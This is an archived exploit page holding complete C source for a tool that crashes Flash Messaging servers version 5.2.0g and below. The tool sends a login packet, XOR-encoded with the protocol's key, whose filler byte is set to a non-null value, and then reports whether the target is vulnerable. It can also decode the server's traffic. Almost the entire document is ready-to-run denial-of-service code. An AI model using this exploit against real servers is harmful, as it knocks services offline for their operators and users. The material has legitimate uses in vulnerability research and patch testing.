<html>
<head>
<title>Flash Messaging 5.2.0g and below server crash </title>
<pre>
/*

by Luigi Auriemma

*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
/*

Show_dump 0.1

    Copyright 2004 Luigi Auriemma

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307 USA

    http://www.gnu.org/licenses/gpl.txt

function to show the hex dump of a buffer

Usage:

    to show the hex dump on the screen:
        show_dump(buffer, buffer_length, stdout);

    to write the hex dump in a file or other streams:
        show_dump(buffer, buffer_length, fd);

    (if you know C you know what FILE *stream means 8-)
*/



void show_dump(unsigned char *buff, unsigned long buffsz, FILE *stream) {
    const char      *hex = &quot;0123456789abcdef&quot;;
    unsigned char   buffout[68],
                    *pout,
                    *p1,
                    *p2,
                    i,
                    rest;


    p1 = buff;
    p2 = buff;

    while(buffsz) {

        pout = buffout;
        if(buffsz &lt; 16) rest = buffsz;
            else rest = 16;

        for(i = 0; i &lt; rest; i++, p1++) {
            *pout++ = hex[*p1 &gt;&gt; 4];
            *pout++ = hex[*p1 &amp; 0xf];
            *pout++ = 0x20;
        }

        for(i = pout - buffout; i &lt; 50; i++, pout++) *pout = 0x20;

        for(i = 0; i &lt; rest; i++, p2++, pout++) {
            if(*p2 &gt;= 0x20) *pout = *p2;
                else *pout = 0x2e;
        }

        *pout++ = 0x0a;
        *pout   = 0x00;

        fputs(buffout, stream);
        buffsz -= rest;
    }
}




#ifdef WIN32
    #include &lt;winsock.h&gt;
/*
   Header file used for manage errors in Windows
   It support socket and errno too
   (this header replace the previous sock_errX.h)
*/

#include &lt;string.h&gt;
#include &lt;errno.h&gt;



void std_err(void) {
    char    *error;

    switch(WSAGetLastError()) {
        case 10004: error = &quot;Interrupted system call&quot;; break;
        case 10009: error = &quot;Bad file number&quot;; break;
        case 10013: error = &quot;Permission denied&quot;; break;
        case 10014: error = &quot;Bad address&quot;; break;
        case 10022: error = &quot;Invalid argument (not bind)&quot;; break;
        case 10024: error = &quot;Too many open files&quot;; break;
        case 10035: error = &quot;Operation would block&quot;; break;
        case 10036: error = &quot;Operation now in progress&quot;; break;
        case 10037: error = &quot;Operation already in progress&quot;; break;
        case 10038: error = &quot;Socket operation on non-socket&quot;; break;
        case 10039: error = &quot;Destination address required&quot;; break;
        case 10040: error = &quot;Message too long&quot;; break;
        case 10041: error = &quot;Protocol wrong type for socket&quot;; break;
        case 10042: error = &quot;Bad protocol option&quot;; break;
        case 10043: error = &quot;Protocol not supported&quot;; break;
        case 10044: error = &quot;Socket type not supported&quot;; break;
        case 10045: error = &quot;Operation not supported on socket&quot;; break;
        case 10046: error = &quot;Protocol family not supported&quot;; break;
        case 10047: error = &quot;Address family not supported by protocol family&quot;; break;
        case 10048: error = &quot;Address already in use&quot;; break;
        case 10049: error = &quot;Can't assign requested address&quot;; break;
        case 10050: error = &quot;Network is down&quot;; break;
        case 10051: error = &quot;Network is unreachable&quot;; break;
        case 10052: error = &quot;Net dropped connection or reset&quot;; break;
        case 10053: error = &quot;Software caused connection abort&quot;; break;
        case 10054: error = &quot;Connection reset by peer&quot;; break;
        case 10055: error = &quot;No buffer space available&quot;; break;
        case 10056: error = &quot;Socket is already connected&quot;; break;
        case 10057: error = &quot;Socket is not connected&quot;; break;
        case 10058: error = &quot;Can't send after socket shutdown&quot;; break;
        case 10059: error = &quot;Too many references, can't splice&quot;; break;
        case 10060: error = &quot;Connection timed out&quot;; break;
        case 10061: error = &quot;Connection refused&quot;; break;
        case 10062: error = &quot;Too many levels of symbolic links&quot;; break;
        case 10063: error = &quot;File name too long&quot;; break;
        case 10064: error = &quot;Host is down&quot;; break;
        case 10065: error = &quot;No Route to Host&quot;; break;
        case 10066: error = &quot;Directory not empty&quot;; break;
        case 10067: error = &quot;Too many processes&quot;; break;
        case 10068: error = &quot;Too many users&quot;; break;
        case 10069: error = &quot;Disc Quota Exceeded&quot;; break;
        case 10070: error = &quot;Stale NFS file handle&quot;; break;
        case 10091: error = &quot;Network SubSystem is unavailable&quot;; break;
        case 10092: error = &quot;WINSOCK DLL Version out of range&quot;; break;
        case 10093: error = &quot;Successful WSASTARTUP not yet performed&quot;; break;
        case 10071: error = &quot;Too many levels of remote in path&quot;; break;
        case 11001: error = &quot;Host not found&quot;; break;
        case 11002: error = &quot;Non-Authoritative Host not found&quot;; break;
        case 11003: error = &quot;Non-Recoverable errors: FORMERR, REFUSED, NOTIMP&quot;; break;
        case 11004: error = &quot;Valid name, no data record of requested type&quot;; break;
        default: error = strerror(errno); break;
    }
    fprintf(stderr, &quot;\nError: %s\n&quot;, error);
    exit(1);
}

    #define close   closesocket
#else
    #include &lt;unistd.h&gt;
    #include &lt;sys/socket.h&gt;
    #include &lt;sys/types.h&gt;
    #include &lt;arpa/inet.h&gt;
    #include &lt;netdb.h&gt;
    #include &lt;netinet/in.h&gt;
#endif



#define VER     &quot;0.1&quot;
#define PORT    645
#define BUFFSZ  8192
#define TIMEOUT 3
#define LOGIN   &quot;\xd1&quot; &quot;3&quot; \
                &quot;\xd1&quot; &quot;1&quot; \
                &quot;\xd1&quot; &quot;10/07/2004&quot; /* date */ \
                &quot;\xd1&quot; &quot;00.00.00&quot;   /* time (hh.mm.ss) */ \
                &quot;\xd1&quot; \
                &quot;\xd1&quot; \
                &quot;\xd1&quot; &quot;%s&quot;         /* nickname */ \
                &quot;\xd1&quot; \
                &quot;\xd1&quot; &quot;000000&quot; \
                &quot;\xd1&quot;



int timeout(int sock);
void flashmsg_algo(u_char *data, int len);
u_long resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int         sd,
                i,
                len,
                nonull = 0,
                chr    = 0x69;
                /* the normal chr must be 0x00, and if it is different */
                /* causes the immediate crash of the server */
    u_short     port = PORT;
    u_char      buff[BUFFSZ],
                pck[BUFFSZ &gt;&gt; 1],
                *p,
                *nickname = &quot;crash&quot;;


    setbuf(stdout, NULL);

    fputs(&quot;\n&quot;
        &quot;Flash Messaging &lt;= 5.2.0g (rev 1.1.2) server crash and decoder &quot;VER&quot;\n&quot;
        &quot;by Luigi Auriemma\n&quot;
        &quot;e-mail: aluigi@altervista.org\n&quot;
        &quot;web:    http://aluigi.altervista.org\n&quot;
        &quot;\n&quot;, stdout);

    if(argc &lt; 2) {
        printf(&quot;\n&quot;
            &quot;Usage: %s [options] &lt;server&gt;\n&quot;
            &quot;\n&quot;
            &quot;Options:\n&quot;
            &quot;-p PORT   specify the server port (default %d)\n&quot;
            &quot;-s NICK   this tool will act as a client emulator and will show any decoded\n&quot;
            &quot;          message or command sent by the server to you.\n&quot;
            &quot;          You must also specify the nickname you wanna use\n&quot;
            &quot;          By default this tool is a proof-of-concept ables to crash the server\n&quot;
            &quot;-n        use this option to see any server data in a more comprehensible text\n&quot;
            &quot;          format. By default any data block is showed in hexadecimal mode\n&quot;
            &quot;\n&quot;, argv[0], PORT);
        exit(1);
    }

    argc--;
    for(i = 1; i &lt; argc; i++) {
        switch(argv[i][1]) {
            case 'p': port = atoi(argv[++i]); break;
            case 's': {
                chr = 0x00;
                nickname = argv[++i];
                } break;
            case 'n': nonull = 1; break;
            default: {
                printf(&quot;\nError: wrong command-line argument (%s)\n\n&quot;, argv[i]);
                exit(1);
            }
        }
    }

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &amp;wsadata);
#endif

    peer.sin_addr.s_addr = resolv(argv[argc]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd &lt; 0) std_err();

    printf(&quot;- target   %s:%hu\n&quot;,
        inet_ntoa(peer.sin_addr),
        port);
    if(connect(sd, (struct sockaddr *)&amp;peer, sizeof(peer))
      &lt; 0) std_err();

    fputs(&quot;- prepare login data\n&quot;, stdout);
    len = snprintf(
        pck,
        sizeof(pck) - 1,
        LOGIN,
        nickname);
    if((len &lt; 0) || (len &gt; sizeof(pck))) {
        fputs(&quot;\nError: the nickname you have inserted is longer than my buffer\n\n&quot;, stdout);
        exit(1);
    }

    p = buff;
    for(i = 0; i &lt; len; i++) {
        *p++ = pck[i];
        *p++ = chr;
    }

    len &lt;&lt;= 1;
    flashmsg_algo(buff, len);

    fputs(&quot;- send login data\n&quot;, stdout);
    if(send(sd, buff, len, 0)
      &lt; 0) std_err();

    if(chr) {
        fputs(&quot;- check server\n&quot;, stdout);
        if((timeout(sd) &lt; 0) || ((len = recv(sd, buff, BUFFSZ, 0)) &lt;= 0)) {
            fputs(&quot;\nServer IS vulnerable!!!\n\n&quot;, stdout);
        } else {
            fputs(&quot;\nServer doesn't seem vulnerable, check its decoded reply:\n&quot;, stdout);
            show_dump(buff, len, stdout);
        }
    } else {
        for(;;) {
            len = recv(sd, buff, BUFFSZ, 0);
            if(len &lt; 0) std_err();
            if(!len) break;
            flashmsg_algo(buff, len);
            if(nonull) {
                p = buff;
                for(i = 0; i &lt; len; i += 2, p++) {
                    *p = buff[i];
                    if(*p == 0xd1) *p = '\n';   // 0xd1 = delimiter
                }
                *p = 0x00;
                printf(&quot;\n--------------------\n%s&quot;, buff);
            } else {
                fputc('\n', stdout);
                show_dump(buff, len, stdout);
            }
        }
    }

    close(sd);

    return(0);
}



void flashmsg_algo(u_char *data, int len) {
    int     i;
    const static u_char encdata[] =
            &quot;ScratchIt&quot; &quot;YouFool&quot;;

    for(i = 0; i &lt; len; i++) {
        *data++ ^= encdata[i &amp; 15] - 38;
        *data++ ^= 38;
    }
}



int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec = TIMEOUT;
    tout.tv_usec = 0;
    FD_ZERO(&amp;fd_read);
    FD_SET(sock, &amp;fd_read);
    err = select(sock + 1, &amp;fd_read, NULL, NULL, &amp;tout);
    if(err &lt; 0) std_err();
    if(!err) return(-1);
    return(0);
}



u_long resolv(char *host) {
    struct  hostent *hp;
    u_long  host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf(&quot;\nError: Unable to resolve hostname (%s)\n&quot;, host);
            exit(1);
        } else host_ip = *(u_long *)hp-&gt;h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror(&quot;\nError&quot;);
        exit(1);
    }
#endif


</pre>
//milw0rm.com
</html>

